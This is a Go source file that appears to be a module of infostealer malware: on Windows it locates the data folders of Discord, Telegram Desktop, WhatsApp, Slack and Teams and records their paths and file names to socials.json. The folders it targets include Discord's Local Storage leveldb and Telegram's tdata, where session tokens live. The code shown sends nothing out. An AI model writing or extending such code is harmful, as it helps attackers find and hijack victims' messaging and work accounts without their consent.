// ============================================================
// socials.go - Social Media Account Extraction
// ============================================================
package socials

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

type SocialAccount struct {
	Platform string   `json:"platform"`
	Path     string   `json:"path"`
	Files    []string `json:"files"`
}

// Run extracts social media account information
func Run() {
	log.Println("📱 Extracting social media accounts...")
	
	var socials []SocialAccount
	
	// Discord
	if discord := findDiscord(); discord != nil {
		socials = append(socials, *discord)
	}
	
	// Telegram
	if telegram := findTelegram(); telegram != nil {
		socials = append(socials, *telegram)
	}
	
	// WhatsApp
	if whatsapp := findWhatsApp(); whatsapp != nil {
		socials = append(socials, *whatsapp)
	}
	
	// Slack
	if slack := findSlack(); slack != nil {
		socials = append(socials, *slack)
	}
	
	// Teams
	if teams := findTeams(); teams != nil {
		socials = append(socials, *teams)
	}
	
	saveSocials(socials)
}

// findDiscord finds Discord data
func findDiscord() *SocialAccount {
	if runtime.GOOS == "windows" {
		discordPath := filepath.Join(os.Getenv("APPDATA"), "Discord")
		if _, err := os.Stat(discordPath); err == nil {
			account := &SocialAccount{
				Platform: "Discord",
				Path:     discordPath,
			}
			
			// Check for Local Storage
			localStorage := filepath.Join(discordPath, "Local Storage", "leveldb")
			if _, err := os.Stat(localStorage); err == nil {
				files, _ := os.ReadDir(localStorage)
				for _, file := range files {
					account.Files = append(account.Files, file.Name())
				}
			}
			
			return account
		}
	}
	return nil
}

// findTelegram finds Telegram data
func findTelegram() *SocialAccount {
	if runtime.GOOS == "windows" {
		telegramPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop")
		if _, err := os.Stat(telegramPath); err == nil {
			account := &SocialAccount{
				Platform: "Telegram",
				Path:     telegramPath,
			}
			
			// Check for tdata
			tdata := filepath.Join(telegramPath, "tdata")
			if _, err := os.Stat(tdata); err == nil {
				files, _ := os.ReadDir(tdata)
				for _, file := range files {
					account.Files = append(account.Files, file.Name())
				}
			}
			
			return account
		}
	}
	return nil
}

// findWhatsApp finds WhatsApp data
func findWhatsApp() *SocialAccount {
	if runtime.GOOS == "windows" {
		whatsappPath := filepath.Join(os.Getenv("APPDATA"), "WhatsApp")
		if _, err := os.Stat(whatsappPath); err == nil {
			account := &SocialAccount{
				Platform: "WhatsApp",
				Path:     whatsappPath,
			}
			
			files, _ := os.ReadDir(whatsappPath)
			for _, file := range files {
				account.Files = append(account.Files, file.Name())
			}
			
			return account
		}
	}
	return nil
}

// findSlack finds Slack data
func findSlack() *SocialAccount {
	if runtime.GOOS == "windows" {
		slackPath := filepath.Join(os.Getenv("APPDATA"), "Slack")
		if _, err := os.Stat(slackPath); err == nil {
			account := &SocialAccount{
				Platform: "Slack",
				Path:     slackPath,
			}
			
			files, _ := os.ReadDir(slackPath)
			for _, file := range files {
				account.Files = append(account.Files, file.Name())
			}
			
			return account
		}
	}
	return nil
}

// findTeams finds Microsoft Teams data
func findTeams() *SocialAccount {
	if runtime.GOOS == "windows" {
		teamsPath := filepath.Join(os.Getenv("APPDATA"), "Teams")
		if _, err := os.Stat(teamsPath); err == nil {
			account := &SocialAccount{
				Platform: "Microsoft Teams",
				Path:     teamsPath,
			}
			
			files, _ := os.ReadDir(teamsPath)
			for _, file := range files {
				account.Files = append(account.Files, file.Name())
			}
			
			return account
		}
	}
	return nil
}

// saveSocials saves social media data to file
func saveSocials(socials []SocialAccount) {
	data, err := json.MarshalIndent(socials, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal socials: %v", err)
		return
	}
	
	if err := os.WriteFile("socials.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save socials: %v", err)
		return
	}
	
	log.Printf("📱 Found %d social media platforms", len(socials))
}